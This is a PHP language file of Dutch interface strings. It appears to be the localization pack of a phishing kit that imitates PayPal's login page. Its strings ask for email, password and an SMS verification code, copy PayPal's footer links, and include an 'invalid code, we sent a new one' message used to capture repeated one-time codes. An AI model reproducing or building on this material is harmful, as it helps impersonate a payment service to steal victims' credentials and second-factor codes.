<?php

function lang($phrase){
    static $lang = array(
        '1' => 'Log in op je PayPal-account',
        '2' => 'E-mail of mobiel nummer',
        '3' => 'Wachtwoord',
        '4' => 'Wachtwoord vergeten?',
        '5' => 'Inloggen',
        '6' => 'of',
        '7' => 'Aanmelden',
        '8' => 'Engels',
        '9' => 'Frans',
        '10' => 'Spaans',
        '11' => '文',
        '12' => 'Snelle beveiligingscontrole',
        '13' => 'We hebben wat extra informatie nodig om te bevestigen dat jij het bent.',
        '14' => 'Ontvang een tekst',
        '15' => 'Door verder te gaan, bevestig je dat je gemachtigd bent om dit telefoonnummer te gebruiken en ermee instemt om tekstberichten te ontvangen ter bevestiging van je identiteit in deze sessie. Er kunnen kosten in rekening worden gebracht door de provider. We kunnen abonnements- en apparaatgegevens ontvangen van je draadloze operator voor risico- en fraudedoeleinden.',
        '16' => 'Volgende',
        '17' => 'Voer je code in.',
        '18' => 'Opnieuw verzenden',
        '19' => 'Doorgaan',
        '20' => 'Contact opnemen',
        '21' => 'Privacy',
        '22' => 'Juridisch',
        '23' => 'Beleidsupdates',
        '24' => 'Wereldwijd',
        '25' => 'Ongeldige code. We hebben je een nieuwe code gestuurd.',
    );

    return $lang[$phrase];
}
?>
